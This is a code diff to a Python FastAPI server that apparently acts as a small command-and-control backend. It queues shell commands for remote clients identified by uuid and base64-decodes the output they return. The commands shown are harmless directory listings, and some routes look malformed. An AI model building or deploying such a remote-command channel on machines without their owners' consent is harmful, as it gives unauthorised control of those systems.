@@ -2,6 +2,7 @@ import re
 
 from fastapi import FastAPI, Response, Request, Form
 import logging
+import base64
 
 # Configure Logging
 logging.basicConfig(filename="logs.log",
@@ -14,6 +15,11 @@ logger.setLevel(logging.DEBUG)
 valid_uuids = ['test-system',
                'ligma',
                'tctcl']
+
+# Commands are executed in reverse order -
+command_list = ['dir',
+                'cd ..',
+                'dir']
 
 app = FastAPI()
 
@@ -30,7 +36,22 @@ def ping(uuid: str):
 
 @app.get('/commands/<{uuid}>')
 def command(uuid: str):
+    if len(command_list) > 0:
+        return Response(command_list[len(command_list) - 1])
+    else:
+        return Response('')
+
+
+@app.get('/command_response/<{uuid}>{response}')
+def command_response(response: str):
+    if len(command_list) > 0:
+        command_list.remove(command_list[len(command_list) - 1])
+        decoded_response = response.encode('ascii')
+        decoded_response = base64.b64decode(decoded_response)
+        decoded_response = decoded_response.decode('ascii')
+        print(decoded_response)
     return Response('')
+
 
 
 @app.middleware("http")
